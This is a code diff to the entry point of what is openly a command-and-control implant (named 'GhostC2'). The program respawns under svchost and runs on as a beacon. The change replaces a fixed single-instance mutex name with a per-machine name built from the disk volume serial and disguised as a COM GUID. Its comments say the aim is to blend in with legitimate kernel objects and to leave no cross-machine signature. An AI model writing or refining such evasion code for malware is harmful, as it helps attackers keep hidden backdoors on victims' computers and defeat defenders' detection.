@@ -261,11 +261,31 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         }
     }
 
-    // ── Single-instance mutex — prevent duplicate processes ────────────────
+    // ── Single-instance mutex — machine-unique name derived from volume serial ─
+    // Name is a fake COM GUID so it blends in with legitimate kernel objects.
+    // Different on every target → no cross-machine signature.
+    auto BuildMutexName = []() -> std::wstring {
+        DWORD serial = 0;
+        GetVolumeInformationW(L"C:\\", nullptr, 0, &serial, nullptr, nullptr, nullptr, 0);
+        // Mix serial with a compile-time constant so two installs on the same
+        // machine (different implants) still differ.
+        constexpr DWORD k = 0xA3F7C291u;
+        DWORD a = serial ^ k;
+        DWORD b = (serial >> 16) ^ (k & 0xFFFF);
+        DWORD c = (serial * 0x6B2C1D) & 0xFFFFFFFFu;
+        DWORD d = (serial ^ 0x5E4F3A2B);
+        wchar_t buf[48];
+        // Format: Global\{xxxxxxxx-xxxx-4xxx-8xxx-xxxxxxxxxxxx}
+        swprintf_s(buf, L"Global\\{%08lX-%04lX-4%03lX-8%03lX-%08lX%04lX}",
+                   a, b & 0xFFFF, (c >> 12) & 0xFFF, (c >> 4) & 0xFFF,
+                   d, (a ^ b) & 0xFFFF);
+        return buf;
+    };
+
     HANDLE hGlobalMutex = nullptr;
     {
-        auto mutexName = XSW(L"Global\\GhostC2_9f7a3b1d");
-        hGlobalMutex = CreateMutexW(NULL, TRUE, mutexName.str());
+        std::wstring mutexName = BuildMutexName();
+        hGlobalMutex = CreateMutexW(NULL, TRUE, mutexName.c_str());
         if (GetLastError() == ERROR_ALREADY_EXISTS) {
             if (hGlobalMutex) CloseHandle(hGlobalMutex);
             return 0;
@@ -286,8 +306,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     if (TryRespawnUnderSvchost()) return 0;
     // Re-acquire for the running instance that continues as the beacon.
     {
-        auto mutexName = XSW(L"Global\\GhostC2_9f7a3b1d");
-        hGlobalMutex = CreateMutexW(NULL, TRUE, mutexName.str());
+        std::wstring mutexName = BuildMutexName();
+        hGlobalMutex = CreateMutexW(NULL, TRUE, mutexName.c_str());
         if (GetLastError() == ERROR_ALREADY_EXISTS) {
             if (hGlobalMutex) CloseHandle(hGlobalMutex);
             return 0;
